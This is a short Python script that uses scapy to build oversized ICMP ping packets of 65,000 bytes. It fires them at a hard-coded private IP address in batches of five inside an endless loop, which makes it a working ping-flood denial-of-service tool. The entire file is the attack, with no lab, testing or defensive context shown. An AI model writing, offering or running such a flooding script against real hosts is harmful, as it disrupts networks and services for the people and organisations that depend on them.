import scapy.all as scapy
target_ip_address="172.24.6.53"
ip = scapy.IP(dst=target_ip_address)
icmp = scapy.ICMP()
size_of_packet = 65000
number_of_packets_to_send = 5
raw = scapy.Raw(b"X" * size_of_packet)
p = ip / icmp / raw

def send_ping(target_ip_address, number_of_packets_to_send, size_of_packet):
    scapy.send(p, count=number_of_packets_to_send, verbose=0)
    print('Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)

while True:
    send_ping(target_ip_address, number_of_packets_to_send, size_of_packet)
